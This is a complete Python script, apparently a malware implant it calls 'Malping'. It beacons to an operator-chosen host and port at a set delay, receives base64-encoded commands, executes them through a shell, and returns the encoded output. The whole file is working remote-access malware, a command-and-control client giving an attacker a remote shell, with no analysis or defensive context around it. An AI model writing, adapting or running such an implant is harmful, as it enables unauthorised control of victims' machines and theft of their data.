#!/usr/bin/env python

import sys
import time
import socket
import base64
import datetime
import argparse
import subprocess
import logging as log

SIZE = 1024


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='IP', type=str)
    parser.add_argument('delay', metavar='DELAY', type=int, help='(s)')
    parser.add_argument('-p', '--port')
    parser.add_argument('-v', '--verbose', action="store_true")
    return parser.parse_args()


def main():
    args = get_args()

    if args.verbose:
        log.basicConfig(format='%(message)s', level=log.INFO)
    else:
        log.basicConfig(format='%(message)s')

    DELAY = args.delay
    HOST = args.host
    PORT = int(args.port) if args.port else 80

    log.info(('[+] Malping started with delay of {} seconds to port {}.' +
              ' Ctrl-c to exit.').format(DELAY, PORT))

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((HOST, PORT))
                cmd = base64.b64decode(s.recv(SIZE))
                log.info('[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
                                                          cmd))
                stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                          shell=True).communicate()[0]
                response = base64.b64encode(stdout)
                s.send(response)
            except socket.error:
                log.info(('[!] ({}) Could not connect to server.' +
                          ' Waiting...').format(datetime.datetime.now()))
            finally:
                time.sleep(DELAY)
        except KeyboardInterrupt:
            log.info('[-] Malping terminated.')
            sys.exit(0)

if __name__ == '__main__':
    main()
